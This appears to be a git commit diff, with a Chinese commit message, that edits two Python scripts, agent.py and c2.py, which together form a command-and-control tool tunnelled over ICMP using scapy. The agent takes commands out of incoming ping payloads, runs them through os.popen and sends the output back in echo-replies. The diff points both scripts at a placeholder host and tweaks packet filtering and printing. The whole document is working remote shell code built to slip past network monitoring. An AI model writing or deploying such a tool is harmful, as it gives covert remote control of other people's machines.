415de2a7fe7916e495978a156986842fab39bd79
黄加南 <jianan.huang@yiducloud.cn>
2019-03-13 16:55:20 +0800

    优化处理

--- agent.py
+++ agent.py
@@ -7,10 +7,12 @@ def main():
         # to be received
         rx = sniff(filter="icmp", count=1)
         # strip down the packet to the payload itself
+        #var = rx[0][Raw]
         var = rx[0][Raw].load.decode('utf-8')
         # run the command and save the result
         res = os.popen(var).read()
+        print res
         # build the ICMP packet with the result as the payload
-        send(IP(dst="localhost")/ICMP(type="echo-reply", id=0x0001, seq=0x1)/res)
+        send(IP(dst="xxx")/ICMP(type="echo-reply", id=0x0001, seq=0x1)/res)
 if __name__ == "__main__":
     main()
--- c2.py
+++ c2.py
@@ -4,12 +4,15 @@ def main():
     while True:
         command = raw_input('# Enter command: ')
         # build the ICMP packet with the command as the payload
-        pinger = IP(dst="localhost")/ICMP(id=0x0001, seq=0x1)/command
+        pinger = IP(dst="xxx")/ICMP(id=0x0001, seq=0x1)/command
         send(pinger)
         # wait for the ICMP message containing the answer from the agent   
         # to be received
-        rx = sniff(count=1, timeout=2)
+        rx = sniff(count=1, timeout=2, filter='icmp')
         # use this if agent is not on local machine: rx = sniff(filter="icmp", count=1)
-        print(rx[0][Raw].load.decode('utf-8'))
+        print(rx[0][Raw])
+        #print(rx[0][Raw].load.decode('utf-8'))
+        # received
+
 if __name__ == "__main__":
     main()
